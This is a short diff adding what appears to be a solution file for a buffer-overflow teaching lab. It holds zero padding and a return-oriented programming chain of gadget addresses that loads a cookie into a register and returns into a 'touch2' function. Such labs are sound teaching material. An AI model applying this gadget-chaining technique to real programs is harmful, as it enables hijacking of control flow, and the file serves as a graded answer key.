@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+ab 19 40 00 00 00 00 00 /* set return address to <addval_219+0x4> { [popq %rax], [nop], [ret] } */
+fa 97 b9 59 00 00 00 00 /* store cookie value on the stack */
+a2 19 40 00 00 00 00 00 /* set return address to <addval_273+0x2> { [movq %rax, %rdi], [ret] } */
+ec 17 40 00 00 00 00 00 /* set return address to touch2 */
